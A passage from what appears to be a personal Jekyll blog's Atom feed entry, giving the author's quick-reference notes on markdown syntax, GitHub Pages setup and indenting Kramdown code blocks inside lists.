&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;``` YEAR-MONTH-DAY-title.md ```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To create a link, use &lt;code class=&quot;highlighter-rouge&quot;&gt;\[Text\]\(http\(s\)://site\.com\)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;You can add a excerpt_separator: line to your _config.yml file to set a preview in your post. I haven’t gotten it to work yet…&lt;/p&gt;

&lt;p&gt;These are the original notes from the Jekyll page creation. Good stuff.&lt;/p&gt;

&lt;h2 id=&quot;welcome-to-github-pages&quot;&gt;Welcome to GitHub Pages&lt;/h2&gt;

&lt;p&gt;You can use the &lt;a href=&quot;https://github.com/remotephone/remotephone.github.io/edit/master/index.md&quot;&gt;editor on GitHub&lt;/a&gt; to maintain and preview the content for your website in Markdown files.&lt;/p&gt;

&lt;p&gt;Whenever you commit to this repository, GitHub Pages will run &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt; to rebuild the pages in your site, from the content in your Markdown files.&lt;/p&gt;

&lt;h3 id=&quot;markdown&quot;&gt;Markdown&lt;/h3&gt;

&lt;p&gt;Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for&lt;/p&gt;

&lt;div class=&quot;language-markdown highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syntax highlighted code block

&lt;span class=&quot;gh&quot;&gt;# Header 1&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Header 2&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;### Header 3&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;
-&lt;/span&gt; Bulleted
&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; List
&lt;span class=&quot;p&quot;&gt;
1.&lt;/span&gt; Numbered
&lt;span class=&quot;p&quot;&gt;2.&lt;/span&gt; List

&lt;span class=&quot;gs&quot;&gt;**Bold**&lt;/span&gt; and _Italic_ and &lt;span class=&quot;sb&quot;&gt;`Code`&lt;/span&gt; text

&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; and !&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For more details see &lt;a href=&quot;https://guides.github.com/features/mastering-markdown/&quot;&gt;GitHub Flavored Markdown&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;kramdown-code-blocks-in-lists&quot;&gt;Kramdown Code Blocks in Lists&lt;/h3&gt;

&lt;p&gt;This was throwing me for a loop, but if you want code blocks in a list, you need to make the beginning of the code block match the indent of the list with spaces. See &lt;a href=&quot;https://planetjekyll.github.io/sandbox-syntax-highlighter/lists.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Does not display cleanly when everything starts on the first space of each new line:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;List&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Nice and clean:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;List&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><summary type="html">I don’t know markdown syntax but it seems easy enough. This page is intended to be a quick reference for the 5-10 things I will no doubt do over and over and over.</summary></entry></feed>